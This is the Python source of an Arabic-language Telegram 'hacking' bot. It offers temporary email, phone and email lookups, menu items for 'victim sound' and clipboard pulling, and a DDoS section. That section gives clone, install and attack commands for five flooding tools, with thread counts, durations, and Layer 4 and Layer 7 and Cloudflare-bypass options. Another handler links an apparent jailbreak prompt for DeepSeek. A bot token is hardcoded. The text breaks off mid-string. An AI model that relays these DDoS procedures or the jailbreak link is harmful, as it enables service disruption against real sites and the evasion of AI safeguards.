import logging
import requests
from bs4 import BeautifulSoup
import random
import string
import re
import base64
import socket
import threading
import time
from datetime import datetime
import json

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ConversationHandler
)

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)

logger = logging.getLogger(__name__)

# Replace with your bot token
TOKEN = "8729922349:AAGALtZjbmQAmZFx0wEynXK8osEDOAVsG1o"

# Numverify API Key (احصل على مفتاح مجاني من https://apilayer.com/)
NUMVERIFY_API_KEY = "YOUR_API_KEY"  # استبدل هذا بمفتاحك المجاني

# States for ConversationHandler
(
    CHOOSING_MAIN_MENU,
    GETTING_WEBSITE_URL,
    GETTING_IP_INFO_QUERY,
    GETTING_TELEGRAM_USER_ID,
    GETTING_ROBLOX_USERNAME,
    GETTING_DECORATE_TEXT,
    GETTING_DECRYPT_ROBLOX_SCRIPT,
    GETTING_CHECK_LINK_URL,
    GETTING_PHONE_NUMBER,
    GETTING_EMAIL_ADDRESS,
) = range(10)

# Main menu keyboard
main_menu_keyboard = [
    [InlineKeyboardButton("ملفات موقع 🌐", callback_data='website_files'), InlineKeyboardButton("معلومات IP 📍", callback_data='ip_info')],
    [InlineKeyboardButton("ايميل وهمي 📧", callback_data='temp_email'), InlineKeyboardButton("ادوات اختراق 🛠️", callback_data='hacking_tools')],
    [InlineKeyboardButton("بحث عن مستخدم 🔍", callback_data='search_user'), InlineKeyboardButton("سحب الحافظه 📋", callback_data='clipboard_pull')],
    [InlineKeyboardButton("صوت ضحيه 🎤", callback_data='victim_sound'), InlineKeyboardButton("كيف تصبح هاكر 👨‍💻", callback_data='how_to_be_hacker')],
    [InlineKeyboardButton("فك تشفير سكربتات روبلوكس base64 🔓", callback_data='decrypt_roblox'), InlineKeyboardButton("معلومات حساب روبلوكس 👤", callback_data='roblox_account_info')],
    [InlineKeyboardButton("زخرفه ✨", callback_data='decorate_text'), InlineKeyboardButton("نكته 😂", callback_data='joke')],
    [InlineKeyboardButton("اداة DDOS خفيفه تعليميه 💥", callback_data='ddos_tool'), InlineKeyboardButton("فحص الرابط 🔗", callback_data='check_link')],
    [InlineKeyboardButton("توليد كلمات مرور 🔑", callback_data='generate_password'), InlineKeyboardButton("تعليمات 📜", callback_data='instructions')],
    [InlineKeyboardButton("تحليل رقم الهاتف 📱", callback_data='analyze_phone'), InlineKeyboardButton("تحليل الإيميل 📧", callback_data='analyze_email')],
    [InlineKeyboardButton("شرح استعمال DDOS 🛠️", callback_data='ddos_explain'), InlineKeyboardButton("برومبت ديبسيك 😈", callback_data='deepseek_prompt')],
]
main_menu_reply_markup = InlineKeyboardMarkup(main_menu_keyboard)

# Store user email data
user_emails = {}

async def start(update: Update, context) -> int:
    user = update.effective_user
    await update.message.reply_html(
        f"مرحباً {user.mention_html()}!\n\nأهلاً بك في بوت 7X 😈!\nمعرف حسابك التليجرام هو: {user.id}",
        reply_markup=main_menu_reply_markup
    )
    return CHOOSING_MAIN_MENU

async def main_menu(update: Update, context) -> int:
    user = update.effective_user
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        f"مرحباً {user.mention_html()}!\n\nأهلاً بك في بوت 7X 😈!\nمعرف حسابك التليجرام هو: {user.id}",
        reply_markup=main_menu_reply_markup
    )
    return CHOOSING_MAIN_MENU

async def generate_temp_email_1secmail(update: Update, context) -> None:
    """Generate a temporary email using 1SecMail API"""
    try:
        response = requests.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
        response.raise_for_status()
        
        email_data = response.json()
        if not email_data:
            await update.callback_query.edit_message_text(
                "❌ عذراً، تعذر إنشاء بريد إلكتروني مؤقت. حاول مرة أخرى.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
            )
            return
        
        email = email_data[0]
        login, domain = email.split('@')
        
        user_id = update.callback_query.from_user.id
        user_emails[user_id] = {
            'email': email,
            'login': login,
            'domain': domain
        }
        
        email_info = f"""
✅ تم إنشاء بريد إلكتروني مؤقت جديد:

📧 **البريد الإلكتروني:** `{email}`

📌 يمكنك استخدام هذا البريد لاستقبال الرسائل.
⏳ البريد صالح لمدة 24 ساعة من آخر استخدام.

**ملاحظة:** لا يمكنك إرسال رسائل من هذا البريد، فقط استقبال.
"""
        
        keyboard = [
            [InlineKeyboardButton("📥 عرض الرسائل", callback_data='view_messages')],
            [InlineKeyboardButton("🔄 إنشاء بريد جديد", callback_data='temp_email')],
            [InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]
        ]
        
        await update.callback_query.edit_message_text(
            email_info,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        
    except requests.exceptions.RequestException as e:
        await update.callback_query.edit_message_text(
            f"❌ حدث خطأ أثناء الاتصال بـ 1SecMail: {e}\nالرجاء المحاولة مرة أخرى.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )
    except Exception as e:
        await update.callback_query.edit_message_text(
            f"⚠️ حدث خطأ غير متوقع: {e}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )

async def view_email_messages(update: Update, context) -> None:
    """View messages for the current user's temporary email"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    if user_id not in user_emails:
        await query.edit_message_text(
            "❌ لا يوجد بريد إلكتروني نشط. الرجاء إنشاء بريد جديد أولاً.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📧 إنشاء بريد جديد", callback_data='temp_email')],
                [InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]
            ])
        )
        return
    
    email_data = user_emails[user_id]
    login = email_data['login']
    domain = email_data['domain']
    
    try:
        response = requests.get(
            f"https://www.1secmail.com/api/v1/?action=getMessages&login={login}&domain={domain}"
        )
        response.raise_for_status()
        messages = response.json()
        
        if not messages:
            await query.edit_message_text(
                f"📭 **صندوق الوارد فارغ**\n\nالبريد: `{email_data['email']}`\n\nلا توجد رسائل جديدة.",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 تحديث", callback_data='view_messages')],
                    [InlineKeyboardButton("📧 إنشاء بريد جديد", callback_data='temp_email')],
                    [InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]
                ])
            )
            return
        
        message_list = f"📬 **صندوق الوارد**\n\nالبريد: `{email_data['email']}`\n\n"
        message_buttons = []
        
        for idx, msg in enumerate(messages[:10]):
            subject = msg.get('subject', 'بدون موضوع')
            from_addr = msg.get('from', 'غير معروف')
            date = msg.get('date', 'تاريخ غير معروف')
            
            message_list += f"📩 **{idx+1}.** {subject}\n"
            message_list += f"📤 من: {from_addr}\n"
            message_list += f"📅 {date[:16]}\n\n"
            
            message_buttons.append([
                InlineKeyboardButton(
                    f"📖 قراءة الرسالة {idx+1}", 
                    callback_data=f'read_message_{idx}'
                )
            ])
        
        message_buttons.append([InlineKeyboardButton("🔄 تحديث", callback_data='view_messages')])
        message_buttons.append([InlineKeyboardButton("📧 إنشاء بريد جديد", callback_data='temp_email')])
        message_buttons.append([InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')])
        
        await query.edit_message_text(
            message_list,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(message_buttons)
        )
        
    except requests.exceptions.RequestException as e:
        await query.edit_message_text(
            f"❌ حدث خطأ أثناء جلب الرسائل: {e}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 إعادة المحاولة", callback_data='view_messages')],
                [InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]
            ])
        )
    except Exception as e:
        await query.edit_message_text(
            f"⚠️ حدث خطأ غير متوقع: {e}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )

async def read_email_message(update: Update, context) -> None:
    """Read a specific message from the temporary email"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    message_index = int(query.data.split('_')[2])
    
    if user_id not in user_emails:
        await query.edit_message_text(
            "❌ لا يوجد بريد إلكتروني نشط.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )
        return
    
    email_data = user_emails[user_id]
    login = email_data['login']
    domain = email_data['domain']
    
    try:
        response = requests.get(
            f"https://www.1secmail.com/api/v1/?action=getMessages&login={login}&domain={domain}"
        )
        response.raise_for_status()
        messages = response.json()
        
        if not messages or message_index >= len(messages):
            await query.edit_message_text(
                "❌ الرسالة غير موجودة أو تم حذفها.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📥 عرض الرسائل", callback_data='view_messages')],
                    [InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]
                ])
            )
            return
        
        msg = messages[message_index]
        msg_id = msg.get('id')
        
        if not msg_id:
            await query.edit_message_text(
                "❌ تعذر الحصول على معرف الرسالة.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
            )
            return
        
        read_response = requests.get(
            f"https://www.1secmail.com/api/v1/?action=readMessage&login={login}&domain={domain}&id={msg_id}"
        )
        read_response.raise_for_status()
        message_data = read_response.json()
        
        subject = message_data.get('subject', 'بدون موضوع')
        from_addr = message_data.get('from', 'غير معروف')
        date = message_data.get('date', 'تاريخ غير معروف')
        body = message_data.get('textBody', 'لا يوجد محتوى نصي')
        html_body = message_data.get('htmlBody', '')
        
        if not body and html_body:
            body = re.sub(r'<[^>]+>', ' ', html_body)
            body = re.sub(r'\s+', ' ', body).strip()
        
        if len(body) > 4000:
            body = body[:4000] + "\n\n... (تم اختصار الرسالة)"
        
        message_text = f"""
📧 **الرسالة**

📌 **الموضوع:** {subject}
📤 **المرسل:** {from_addr}
📅 **التاريخ:** {date}

📝 **المحتوى:**
{body}
"""
        
        keyboard = [
            [InlineKeyboardButton("📥 العودة للرسائل", callback_data='view_messages')],
            [InlineKeyboardButton("📧 إنشاء بريد جديد", callback_data='temp_email')],
            [InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]
        ]
        
        await query.edit_message_text(
            message_text,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        
    except requests.exceptions.RequestException as e:
        await query.edit_message_text(
            f"❌ حدث خطأ أثناء قراءة الرسالة: {e}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 إعادة المحاولة", callback_data='view_messages')],
                [InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]
            ])
        )
    except Exception as e:
        await query.edit_message_text(
            f"⚠️ حدث خطأ غير متوقع: {e}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )

async def analyze_phone_number(update: Update, context) -> int:
    """Analyze a phone number using numverify API"""
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "📱 الرجاء إرسال رقم الهاتف للتحليل (مع رمز الدولة، مثال: +966501234567):",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
    )
    return GETTING_PHONE_NUMBER

async def analyze_email(update: Update, context) -> int:
    """Analyze an email address"""
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "📧 الرجاء إرسال البريد الإلكتروني للتحليل (مثال: example@gmail.com):",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
    )
    return GETTING_EMAIL_ADDRESS

async def get_phone_analysis(update: Update, context) -> int:
    """Process phone number analysis"""
    phone_number = update.message.text.strip()
    
    if not phone_number:
        await update.message.reply_text(
            "❌ الرجاء إرسال رقم هاتف صحيح.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )
        return GETTING_PHONE_NUMBER
    
    try:
        # Use numverify API (free tier)
        if NUMVERIFY_API_KEY != "YOUR_API_KEY":
            # Premium API - more accurate
            response = requests.get(
                f"https://apilayer.net/api/validate",
                params={
                    'access_key': NUMVERIFY_API_KEY,
                    'number': phone_number,
                    'format': 1
                }
            )
            response.raise_for_status()
            data = response.json()
            
            if data.get('valid'):
                result = f"""
📱 **تحليل رقم الهاتف**

📞 الرقم: `{data.get('number', 'غير معروف')}`
🌍 الدولة: {data.get('country_name', 'غير معروف')}
🔢 رمز الدولة: +{data.get('country_code', 'غير معروف')}
📍 الموقع: {data.get('location', 'غير معروف')}
📶 النوع: {data.get('line_type', 'غير معروف')}
📡 الشركة: {data.get('carrier', 'غير معروف')}
✅ صحة الرقم: {'صحيح ✅' if data.get('valid') else 'غير صحيح ❌'}

📊 **معلومات إضافية:**
• رمز الاتصال الدولي: {data.get('international_format', 'غير معروف')}
• الرقم المحلي: {data.get('local_format', 'غير معروف')}
"""
            else:
                result = f"""
❌ **تحليل رقم الهاتف**

📞 الرقم: `{phone_number}`
✅ صحة الرقم: غير صحيح ❌

⚠️ الرقم غير صالح أو غير موجود في قاعدة البيانات.
"""
            
            await update.message.reply_text(result, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        
        else:
            # Free alternative - Simple validation using regex and country detection
            # Remove all non-digit characters
            clean_number = re.sub(r'[^\d+]', '', phone_number)
            
            # Simple validation
            is_valid = len(clean_number) >= 7 and len(clean_number) <= 15
            
            # Detect country code (simple mapping)
            country_codes = {
                '+1': 'الولايات المتحدة/كندا',
                '+44': 'المملكة المتحدة',
                '+966': 'السعودية',
                '+971': 'الإمارات',
                '+974': 'قطر',
                '+965': 'الكويت',
                '+968': 'عمان',
                '+973': 'البحرين',
                '+962': 'الأردن',
                '+961': 'لبنان',
                '+972': 'فلسطين',
                '+20': 'مصر',
                '+212': 'المغرب',
                '+216': 'تونس',
                '+213': 'الجزائر',
                '+218': 'ليبيا',
                '+222': 'موريتانيا',
                '+249': 'السودان',
                '+252': 'الصومال',
                '+253': 'جيبوتي',
                '+269': 'جزر القمر',
                '+90': 'تركيا',
                '+91': 'الهند',
                '+92': 'باكستان',
                '+94': 'سريلانكا',
                '+95': 'ميانمار',
                '+60': 'ماليزيا',
                '+62': 'إندونيسيا',
                '+63': 'الفلبين',
                '+64': 'نيوزيلندا',
                '+65': 'سنغافورة',
                '+66': 'تايلاند',
                '+81': 'اليابان',
                '+82': 'كوريا الجنوبية',
                '+84': 'فيتنام',
                '+86': 'الصين',
                '+880': 'بنغلاديش',
                '+977': 'نيبال',
                '+98': 'إيران',
                '+93': 'أفغانستان',
                '+7': 'روسيا',
                '+30': 'اليونان',
                '+31': 'هولندا',
                '+32': 'بلجيكا',
                '+33': 'فرنسا',
                '+34': 'إسبانيا',
                '+36': 'هنغاريا',
                '+39': 'إيطاليا',
                '+40': 'رومانيا',
                '+41': 'سويسرا',
                '+45': 'الدنمارك',
                '+46': 'السويد',
                '+47': 'النرويج',
                '+48': 'بولندا',
                '+49': 'ألمانيا',
                '+351': 'البرتغال',
                '+352': 'لوكسمبورغ',
                '+353': 'أيرلندا',
                '+354': 'آيسلندا',
                '+356': 'مالطا',
                '+357': 'قبرص',
                '+358': 'فنلندا',
                '+359': 'بلغاريا',
                '+370': 'ليتوانيا',
                '+371': 'لاتفيا',
                '+372': 'إستونيا',
                '+373': 'مولدوفا',
                '+374': 'أرمينيا',
                '+375': 'بيلاروسيا',
                '+376': 'أندورا',
                '+377': 'موناكو',
                '+378': 'سان مارينو',
                '+380': 'أوكرانيا',
                '+381': 'صربيا',
                '+382': 'الجبل الأسود',
                '+385': 'كرواتيا',
                '+386': 'سلوفينيا',
                '+387': 'البوسنة والهرسك',
                '+389': 'مقدونيا',
                '+420': 'جمهورية التشيك',
                '+421': 'سلوفاكيا',
                '+423': 'ليختنشتاين',
                '+43': 'النمسا',
                '+500': 'جزر فوكلاند',
                '+501': 'بليز',
                '+502': 'غواتيمالا',
                '+503': 'السلفادور',
                '+504': 'هندوراس',
                '+505': 'نيكاراغوا',
                '+506': 'كوستاريكا',
                '+507': 'بنما',
                '+508': 'سانت بيير وميكلون',
                '+509': 'هايتي',
                '+51': 'بيرو',
                '+52': 'المكسيك',
                '+53': 'كوبا',
                '+54': 'الأرجنتين',
                '+55': 'البرازيل',
                '+56': 'تشيلي',
                '+57': 'كولومبيا',
                '+58': 'فنزويلا',
                '+591': 'بوليفيا',
                '+592': 'غيانا',
                '+593': 'الإكوادور',
                '+595': 'باراغواي',
                '+596': 'مارتينيك',
                '+597': 'سورينام',
                '+598': 'أوروغواي',
                '+61': 'أستراليا',
                '+670': 'تيمور الشرقية',
                '+672': 'القارة القطبية الجنوبية',
                '+673': 'بروناي',
                '+674': 'ناورو',
                '+675': 'بابوا غينيا الجديدة',
                '+676': 'تونغا',
                '+677': 'جزر سليمان',
                '+678': 'فانواتو',
                '+679': 'فيجي',
                '+680': 'بالاو',
                '+681': 'والس وفوتونا',
                '+682': 'جزر كوك',
                '+683': 'نيوي',
                '+685': 'ساموا',
                '+686': 'كيريباتي',
                '+687': 'كاليدونيا الجديدة',
                '+688': 'توفالو',
                '+689': 'بولينيزيا الفرنسية',
                '+690': 'توكيلاو',
                '+691': 'ولايات ميكرونيزيا الموحدة',
                '+692': 'جزر مارشال',
                '+856': 'لاوس',
                '+855': 'كمبوديا',
            }
            
            # Find country code
            country = "غير معروف"
            country_code = "غير معروف"
            for code, name in country_codes.items():
                if clean_number.startswith(code):
                    country = name
                    country_code = code.replace('+', '')
                    break
            
            result = f"""
📱 **تحليل رقم الهاتف** (تحليل أساسي - مجاني)

📞 الرقم: `{clean_number}`
🌍 الدولة: {country}
🔢 رمز الدولة: +{country_code}
✅ صحة الرقم: {'صحيح ✅' if is_valid else 'غير صحيح ❌'}

⚠️ **ملاحظة:** هذا تحليل أساسي مجاني. للحصول على تحليل دقيق (النوع، الشركة، الموقع)، يرجى الحصول على مفتاح API مجاني من apilayer.com
"""
            
            await update.message.reply_text(result, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
            
    except requests.exceptions.RequestException as e:
        await update.message.reply_text(
            f"❌ حدث خطأ أثناء الاتصال بـ API: {e}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )
    except Exception as e:
        await update.message.reply_text(
            f"⚠️ حدث خطأ غير متوقع: {e}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )
    return CHOOSING_MAIN_MENU

async def get_email_analysis(update: Update, context) -> int:
    """Process email analysis"""
    email = update.message.text.strip()
    
    if not email or '@' not in email:
        await update.message.reply_text(
            "❌ الرجاء إرسال بريد إلكتروني صحيح (مثال: example@gmail.com).",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )
        return GETTING_EMAIL_ADDRESS
    
    try:
        # Parse email
        local_part, domain = email.split('@')
        
        # Check domain validity using DNS
        is_valid = False
        domain_status = "غير معروف"
        disposable = False
        email_provider = "غير معروف"
        
        # List of common email providers
        providers = {
            'gmail.com': 'Google Gmail',
            'yahoo.com': 'Yahoo Mail',
            'yahoo.fr': 'Yahoo Mail',
            'yahoo.co.uk': 'Yahoo Mail',
            'outlook.com': 'Microsoft Outlook',
            'hotmail.com': 'Microsoft Hotmail',
            'live.com': 'Microsoft Live',
            'msn.com': 'Microsoft MSN',
            'icloud.com': 'Apple iCloud',
            'me.com': 'Apple Me',
            'mac.com': 'Apple Mac',
            'aol.com': 'AOL Mail',
            'protonmail.com': 'ProtonMail',
            'protonmail.ch': 'ProtonMail',
            'tutanota.com': 'Tutanota',
            'tutanota.de': 'Tutanota',
            'mail.com': 'Mail.com',
            'gmx.com': 'GMX',
            'gmx.de': 'GMX',
            'web.de': 'Web.de',
            'yandex.com': 'Yandex Mail',
            'yandex.ru': 'Yandex Mail',
            'zoho.com': 'Zoho Mail',
            'fastmail.com': 'FastMail',
            'hey.com': 'HEY',
            'skiff.com': 'Skiff',
            'startmail.com': 'StartMail',
            'posteo.de': 'Posteo',
            'mailbox.org': 'Mailbox.org',
            'disroot.org': 'Disroot',
            'riseup.net': 'Riseup',
            'autistici.org': 'Autistici',
            'inventati.org': 'Inventati',
            'keemail.me': 'Keemail',
            'email.com': 'Email.com',
            'usa.com': 'USA.com',
            'europe.com': 'Europe.com',
            'asia.com': 'Asia.com',
            'africa.com': 'Africa.com',
            'australia.com': 'Australia.com',
        }
        
        # List of disposable email domains (temporary email)
        disposable_domains = [
            'tempmail.com', '10minutemail.com', 'guerrillamail.com', 'mailinator.com',
            'trashmail.com', 'spamgourmet.com', 'throwawayemail.com', 'temp-mail.org',
            'getnada.com', 'yopmail.com', 'mailnesia.com', 'spambox.us', 'tempinbox.com',
            'trash2009.com', 'mailnator.com', 'guerrillamail.org', 'tempmail.io',
            'dispostable.com', 'fakeinbox.com', 'maildrop.cc', 'temporary-email.com',
            'mintemail.com', 'mailmetrash.com', 'spamvoid.com', 'trash2009.net',
            'spam.la', 'mailexpire.com', 'spamtrap.co', 'mailtrap.io', 'fake-mail.net',
            'mailcatch.com', 'fakemailgenerator.com', 'inboxbear.com', 'smailpro.com',
            'tempmail.us', 'guerrillamail.info', 'tempemail.co', 'trashmail.net',
            'spambox.net', 'mailismagic.com', 'spamdecoy.net', 'mailinbox.co',
            'tempr.email', 'fakemail.net', 'throwawaymail.com', 'guerrillamail.biz',
            'mailinator2.com', 'trash2009.org', 'spamday.com', 'mailswipe.net',
            'temp-mail.net', '10minutemail.net', 'guerrillamail.net', 'spamthis.com',
            'trash2009.info', 'spamail.net', 'mailinator.net', 'tempinbox.co',
            'guerrillamail.co.uk', 'throwawaymail.net', 'spambox.org', 'mailnator.net',
            'tempmail.co.uk', 'disposablemail.com', 'fakeinbox.net', 'maildrop.org',
            'temporarymail.com', 'spam404.com', 'trash2009.biz', 'mailmetrash.com',
        ]
        
        # Check if it's a disposable domain
        if domain in disposable_domains:
            disposable = True
        
        # Check if it's a known provider
        if domain in providers:
            email_provider = providers[domain]
        
        # Try to check domain MX records
        try:
            import dns.resolver
            mx_records = dns.resolver.resolve(domain, 'MX')
            if mx_records:
                is_valid = True
                domain_status = "نشط ✅"
            else:
                domain_status = "غير نشط ❌"
        except:
            # If DNS lookup fails, try to resolve A record
            try:
                import dns.resolver
                a_records = dns.resolver.resolve(domain, 'A')
                if a_records:
                    is_valid = True
                    domain_status = "نشط ✅"
                else:
                    domain_status = "غير نشط ❌"
            except:
                domain_status = "تعذر التحقق ⚠️"
                # If we can't verify, assume it might be valid if it has a dot and common format
                if '.' in domain and len(domain) > 3:
                    is_valid = True
        
        # Build result
        result = f"""
📧 **تحليل البريد الإلكتروني**

📌 البريد: `{email}`
✅ صحة الإيميل: {'صحيح ✔️' if is_valid else 'غير صحيح ❌'}
📡 مزود البريد: {email_provider}
🗑️ بريد مؤقت: {'نعم 🗑️' if disposable else 'لا ✅'}
🌐 حالة الدومين: {domain_status}

📊 **معلومات إضافية:**
• الجزء المحلي: `{local_part}`
• النطاق: `{domain}`
• طول البريد: {len(email)} حرف
• @ موجود: نعم

⚠️ **ملاحظة:** هذا التحليل أساسي. قد لا يكون دقيقاً 100%.
"""
        
        await update.message.reply_text(result, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        
    except Exception as e:
        await update.message.reply_text(
            f"⚠️ حدث خطأ أثناء تحليل البريد الإلكتروني: {e}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )
    return CHOOSING_MAIN_MENU

async def ddos_explain(update: Update, context) -> None:
    """Show DDOS tools explanation"""
    query = update.callback_query
    await query.answer()
    
    text = """
🛠️ **شرح أدوات DDOS (لأغراض تعليمية فقط)**

---

**🛠️ 1. MHDDoS - أشمل أداة متعددة الطبقات**

هذه الأداة تعتبر من أشهر وأقوى الأدوات، وتدعم أكثر من 56 طريقة هجوم مختلفة، وتعمل على جميع الأنظمة بما في ذلك Termux على الأندرويد. 

· **المميزات:** تدعم الطبقات السابعة (Layer 7) مثل هجمات HTTP و Cloudflare Bypass، والطبقة الرابعة (Layer 4) مثل SYN و UDP Floods، وأدوات مساعدة لاكتشاف IP الحقيقي .
· **رابط الأداة:** https://github.com/MatrixTM/MHDDoS
· **طريقة التشغيل:**
  1. استنساخ المستودع: git clone https://github.com/MatrixTM/MHDDoS.git
  2. الدخول إلى المجلد: cd MHDDoS
  3. تثبيت المتطلبات: pip install -r requirements.txt
  4. تشغيل الهجوم (مثال): python3 start.py GET https://example.com 100 60 حيث 100 عدد الخيوط و 60 المدة بالثواني .

---

**🛠️ 2. Typhon - أداة متقدمة للطبقات الثلاث**

أداة قوية ومتخصصة لاختبار الضغط على الشبكات، وتتميز بقدرتها على تنفيذ هجمات على الطبقات الثالثة والرابعة والسابعة مع دعم أدوات استطلاع متقدمة .

· **المميزات:** هجمات HTTP/HTTPS عالية السرعة باستخدام asyncio، فيضانات UDP و TCP قوية، وأداة "Origin Finder" لاكتشاف IP الخادم الحقيقي .
· **رابط الأداة:** https://github.com/G0odKid/Typhon
· **طريقة التشغيل:**
  1. استنساخ المستودع: git clone https://github.com/G0odKid/Typhon
  2. الدخول إلى المجلد: cd Typhon
  3. تثبيت المتطلبات: pip install -r requirements.txt
  4. هجوم الطبقة السابعة (مثال): python main.py stress -u https://example.com -t 500 -r 1000 (-t عدد المهام، -r عدد الطلبات) .
  5. هجوم الطبقة الرابعة (مثال): python main.py flood -ip 192.168.1.100 -p 80 -t 200 -d 300 --method tcp .

---

**🛠️ 3. ddos_tool_2025 - إطار عمل شامل مع تجاوز للحماية**

إطار عمل مفتوح المصدر مصمم خصيصاً للاختبارات الأخلاقية، ويدعم تقنيات تجاوز الحماية مثل Cloudflare .

· **المميزات:** هجمات متعددة الطبقات (L3/L4/L7)، تقنيات مضخمة (Amplification)، وواجهة سطر أوامر سهلة الاستخدام .
· **رابط الأداة:** https://github.com/infocyn/ddos-2025
· **طريقة التشغيل:**
  1. استنساخ المستودع: git clone https://github.com/infocyn/ddos-2025.git
  2. الدخول إلى المجلد: cd ddos-2025
  3. تثبيت المتطلبات: pip install -r requirements.txt
  4. تشغيل الأداة: python main.py، ثم اختيار نوع الهجوم من القائمة (مثل 3 لـ HTTP Flood) وإدخال المعلومات المطلوبة .

---

**🛠️ 4. FAST-DDoS - أداة سريعة ومتعددة الأساليب**

هذه الأداة مختلفة لأنها مكتوبة بلغة Bash، مما يجعلها خفيفة جداً وسريعة على أنظمة لينكس .

· **المميزات:** تستهدف خدمات محددة مثل ماينكرافت، PSN، XBOX، تدعم هجمات التضخيم (Amplification)، ولا تحتاج إلى تثبيت بايثون، فقط تعتمد على أدوات nmap و hping3 .
· **رابط الأداة:** https://github.com/rickroll747/FAST-DDoS
· **طريقة التشغيل:**
  1. تثبيت المتطلبات: sudo apt install nmap hping3
  2. استنساخ المستودع: git clone https://github.com/rickroll747/FAST-DDoS
  3. الدخول إلى المجلد: cd FAST-DDoS
  4. منح الصلاحيات: chmod +x FAST-DDoS.sh
  5. التشغيل بصلاحيات المدير: sudo ./FAST-DDoS.sh .

---

**🛠️ 5. NS-X-DDOS - محرك احترافي للاختبار**

محرك متعدد الخيوط عالي الأداء، مصمم للأغراض التعليمية واختبار الحمل، ويعمل على جميع الأنظمة بما في ذلك Termux .

· **المميزات:** يدعم طلبات HTTPS، واجهة غنية بالمعلومات، إعدادات متقدمة للتحكم في شدة الهجوم، متوافق مع ويندوز، لينكس، ماك، وTermux .
· **رابط الأداة:** https://github.com/naborajs/NS-X-DDOS
· **طريقة التشغيل:**
  1. استنساخ المستودع: git clone https://github.com/naborajs/NS-X-DDOS.git
  2. الدخول إلى المجلد: cd NS-X-DDOS
  3. تثبيت المتطلبات: pip install -r requirements.txt
  4. تشغيل الأداة: python nsx.py، ثم اتباع التعليمات لتحديد الهدف وشدة الهجوم .

---

⚠️ **تنويه قانوني وأخلاقي مهم**

جميع هذه الأدوات صُنعت لأغراض تعليمية واختبار أمني في بيئات مرخصة. استخدامها على أطراف ثالثة دون إذن صريح يُعتبر جريمة إلكترونية في جميع الدول تقريباً ويعرضك لعقوبات قانونية صارمة. المسؤولية القانونية والأخلاقية تقع عليك بالكامل.
"""
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
    )

async def deepseek_prompt(update: Update, context) -> None:
    """Show DeepSeek prompt link"""
    query = update.callback_query
    await query.answer()
    
    text = """
😈 **برومبت ديبسيك**

انسخ هذا الرابط وأعطه لـ DeepSeek واستمتع!

🔗 **رابط البرومبت:**
https://pastefy.app/EM31V8rs/raw


⚠️ **إخلاء مسؤولية:** 
